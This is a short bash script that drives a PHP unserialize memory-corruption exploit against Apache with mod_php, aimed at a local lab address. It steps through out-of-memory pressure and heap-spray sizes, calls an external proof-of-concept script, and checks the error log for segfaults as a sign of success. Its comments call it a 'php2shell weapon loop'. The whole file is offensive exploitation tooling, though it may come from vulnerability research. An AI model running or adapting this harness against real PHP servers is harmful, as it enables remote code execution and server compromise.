#!/bin/bash
# php2shell weapon loop on Apache prefork+mod_php:
# for each arm-refresh, step p1 pressure until the OOM lands mid-decode
# (unserialize orphan), then step fire sprays across children until one
# reclaims the freed context and walks tmp_var through the forged last_dtor.
set -u
ROOT=/tmp/php2shell_ap
HERE=$(cd "$(dirname "$0")" && pwd)
POC=${POC:-$HERE/../tool/poc_unserialize.py}
SID=u0123456789abcdefghijklmnopqrstuv
URL=http://127.0.0.1:18120/index.php
SEGBEFORE=$(grep -cE "exit signal|Segmentation|SIGSEGV" $ROOT/error.log 2>/dev/null || echo 0)

for P1 in 800 840 880; do
  rm -f $ROOT/sess/sess_$SID
  echo "--- p1 pressure $P1 ---"
  timeout 90 python3 $POC $URL --lab --sid $SID --skip-arm --skip-fire --p1-spray $P1 2>&1 | grep -E '\[p1'
  LAST=$(grep -E "exhausted" $ROOT/error.log | tail -1 | grep -oE 'allocate [0-9]+' | grep -oE '[0-9]+')
  echo "   last fatal alloc: $LAST"
  for FS in 400 550 700 800 870; do
    for T in 1 2 3; do
      R=$(timeout 60 python3 $POC $URL --lab --sid $SID --skip-arm --skip-p1 --fire-sid $SID --spray $FS 2>&1 | grep -E '\[fire\] status')
      SEG=$(grep -cE "exit signal|Segmentation|SIGSEGV" $ROOT/error.log 2>/dev/null || echo 0)
      echo "p1=$P1 fs=$FS t=$T $R seg=$SEG"
      if [ "${SEG:-0}" -gt "${SEGBEFORE:-0}" ]; then
        echo "==== SEGFAULT RECEIPT (p1=$P1 fs=$FS) ===="
        grep -E "exit signal|Segmentation|SIGSEGV" $ROOT/error.log | tail -3
        exit 0
      fi
      case "$R" in *None*|*DEAD*) echo "==== NON-200/no-response (possible kill) p1=$P1 fs=$FS ===="; grep -E "exit signal|Segmentation|child pid" $ROOT/error.log | tail -3; exit 0;; esac
    done
  done
done
echo LOOP_DONE_NO_SEG
